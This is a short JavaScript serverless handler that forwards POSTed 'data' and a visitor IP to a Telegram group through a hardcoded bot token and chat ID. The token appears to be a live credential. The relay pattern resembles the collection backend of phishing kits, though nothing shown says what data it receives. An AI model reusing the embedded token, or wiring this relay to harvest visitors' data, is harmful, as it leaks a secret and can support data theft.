export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { data, ip } = req.body;

      const telegramToken = '7227298167:AAFow-OLLx5nb7qXq8Orx8xan6eoujlB7dI'; // Your Telegram Bot API Token
      const chatId = '-4514758157'; // Your Telegram Group ID

      const telegramApiUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

      const message = `IP: ${ip}\nData: ${data}`;

      const response = await fetch(telegramApiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      if (response.ok) {
        res.status(200).json({ success: true, message: 'Message sent to Telegram' });
      } else {
        res.status(response.status).json({ success: false, message: 'Failed to send message to Telegram' });
      }
    } catch (error) {
      res.status(500).json({ success: false, message: 'Internal Server Error', error: error.message });
    }
  } else {
    res.status(405).json({ success: false, message: 'Method Not Allowed' });
  }
}
